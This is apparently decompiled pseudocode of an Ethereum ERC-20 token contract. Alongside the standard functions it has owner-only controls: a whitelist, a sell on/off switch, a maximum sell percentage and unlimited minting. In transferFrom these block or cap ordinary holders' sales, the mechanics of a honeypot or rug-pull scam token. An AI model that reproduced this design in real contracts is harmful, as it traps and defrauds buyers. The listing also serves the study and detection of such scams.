contract main {




// =====================  Runtime code  =====================


mapping of uint256 balances;
mapping of uint256 sub_0d4a3d96;
mapping of uint256 sub_e0258356;
mapping of uint8 stor3;
mapping of uint256 allowance;
array of uint256 name;
array of uint256 symbol;
uint256 decimals;
uint256 stor8;
uint256 totalSupply;
uint8 sub_e50528ad; offset 160
uint128 stor10; offset 160
address sub_cb23e452Address;
uint256 sub_489b57b0;

function name() payable {
    return name[0 len name.length]
}

function sub_0d4a3d96(?) payable {
    require calldata.size - 4 >= 32
    return sub_0d4a3d96[arg1]
}

function totalSupply() payable {
    return totalSupply
}

function balances(address arg1) payable {
    require calldata.size - 4 >= 32
    return balances[arg1]
}

function decimals() payable {
    return decimals
}

function sub_489b57b0(?) payable {
    return sub_489b57b0
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balances[address(arg1)]
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function whitelist(address arg1) payable {
    require calldata.size - 4 >= 32
    return bool(stor3[arg1])
}

function sub_cb23e452(?) payable {
    return sub_cb23e452Address
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[arg1][arg2]
}

function sub_e0258356(?) payable {
    require calldata.size - 4 >= 32
    return sub_e0258356[arg1]
}

function sub_e50528ad(?) payable {
    return bool(sub_e50528ad)
}

function _fallback() payable {
    revert
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approve(arg2, msg.sender, arg1);
    return 1
}

function sub_2379c4e1(?) payable {
    require calldata.size - 4 >= 32
    if sub_cb23e452Address != msg.sender:
        revert with 0, 'account isn't the owner'
    sub_cb23e452Address = arg1
    return 1
}

function setMaxSellPercent(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if sub_cb23e452Address != msg.sender:
        revert with 0, 'account isn't the owner'
    sub_489b57b0 = arg1
    return 1
}

function setWhitelist(address arg1, bool arg2) payable {
    require calldata.size - 4 >= 64
    if sub_cb23e452Address != msg.sender:
        revert with 0, 'account isn't the owner'
    stor3[address(arg1)] = uint8(arg2)
    return 1
}

function setAllowSell(bool arg1) payable {
    require calldata.size - 4 >= 32
    if sub_cb23e452Address != msg.sender:
        revert with 0, 'account isn't the owner'
    Mask(96, 0, stor10.field_160) = Mask(96, 0, arg1)
    return bool(sub_e50528ad)
}

function mint(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if sub_cb23e452Address != msg.sender:
        revert with 0, 'account isn't the owner'
    totalSupply += arg1 * stor8
    balances[address(stor10.field_0)] += arg1 * stor8
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if balances[address(msg.sender)] < arg2:
        revert with 0, 'balance too low'
    balances[address(arg1)] += arg2
    balances[address(msg.sender)] -= arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if balances[address(arg1)] < arg3:
        revert with 0, 'balance from too low'
    if allowance[address(arg1)][address(msg.sender)] < arg3:
        revert with 0, 'quantity from not allowed'
    if arg1 == sub_cb23e452Address:
        balances[address(arg2)] += arg3
        balances[address(arg1)] -= arg3
        if arg2 != sub_cb23e452Address:
            sub_0d4a3d96[address(arg2)] += arg3
    else:
        if bool(stor3[address(arg1)]) == 1:
            balances[address(arg2)] += arg3
            balances[address(arg1)] -= arg3
        else:
            if bool(sub_e50528ad) != 1:
                revert with 0, 'sale are not allowed'
            if (1000 * sub_e0258356[address(arg1)]) + (1000 * arg3) > sub_0d4a3d96[address(arg1)] * sub_489b57b0:
                revert with 0, 'you can't sell this amount'
            balances[address(arg2)] += arg3
            balances[address(arg1)] -= arg3
            sub_e0258356[address(arg1)] += arg3
    emit Transfer(arg3, arg1, arg2);
    return 1
}



}
